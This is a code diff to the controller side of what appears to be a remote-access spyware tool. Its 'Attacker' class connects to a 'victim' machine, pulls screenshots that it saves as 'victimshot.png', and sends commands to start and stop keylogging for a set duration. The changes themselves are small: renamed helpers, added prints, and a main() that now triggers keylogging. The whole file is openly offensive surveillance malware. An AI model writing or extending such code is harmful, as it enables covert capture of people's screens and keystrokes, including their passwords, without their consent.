@@ -10,6 +10,8 @@ import os
 from PIL import Image
 import io
 import base64
+from threading import Thread, Lock
+from colorama import Fore, Style
 
 SHELL_ARGUMENTS = sys.argv
 
@@ -21,9 +23,9 @@ SOCK_BYTE_LIMIT = 4096
 
 
 # Convert Base64 to Image
-def b64_2_img(data):
-    buff = io.BytesIO(base64.b64decode(data))
-    return Image.open(buff)
+def base64_to_image(data):
+    bytes_buffer = io.BytesIO(base64.b64decode(data))
+    return Image.open(bytes_buffer)
 
 
 class FileBuilder:
@@ -185,7 +187,7 @@ class Attacker:
         if response.save:
             print(response.bytes_content)
             #FileBuilder.image_from_bytes("victim_screenshot.png", response.bytes_content)
-            my_image = b64_2_img(response.bytes_content)
+            my_image = base64_to_image(response.bytes_content)
             my_image.save("victimshot.png")
             print("created an image successfully")
         else:
@@ -227,6 +229,8 @@ class Attacker:
             'resource': 'screenshot'
         })
         self.send(request)
+        print("finished screenshot")
+        return self.receive_and_process()
 
     def start_keylogging(self):
         """ start collecting key-logging info."""
@@ -243,6 +247,7 @@ class Attacker:
             'action': 'log_for',
             'duration': duration
         })
+        print("sending a json request")
         self.send(request)
 
     def stop_keylogging(self):  # TODO: action or request?
@@ -260,7 +265,7 @@ def main():
     attacker = Attacker()
     attacker.connect()
     attacker.request_screenshot()
-    attacker.receive_and_process()
+    attacker.log_for(2)
     attacker.close()
 
 
